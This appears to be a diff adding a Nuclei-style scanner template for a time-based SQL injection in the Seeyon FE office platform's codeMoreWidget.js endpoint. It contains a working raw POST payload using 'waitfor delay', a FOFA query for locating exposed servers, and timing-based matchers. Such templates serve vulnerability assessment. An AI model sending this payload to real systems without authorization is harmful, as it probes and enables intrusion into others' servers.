@@ -1,0 +1,34 @@
+id: seeyon-fe-codeMoreWidget-sqli
+info:
+  name: 致远互联 FE 协作办公平台 codeMoreWidget.js - sqli
+  author: leadlife
+  severity: high
+  description: todo
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0codeMoreWidget.js%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title="FE协作办公平台" || body="li_plugins_download"
+  tags: seeyon,sqli,oa,time
+
+variables:
+  num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /common/codeMoreWidget.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 32
+
+        code=-1';waitfor delay '0:0:6'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
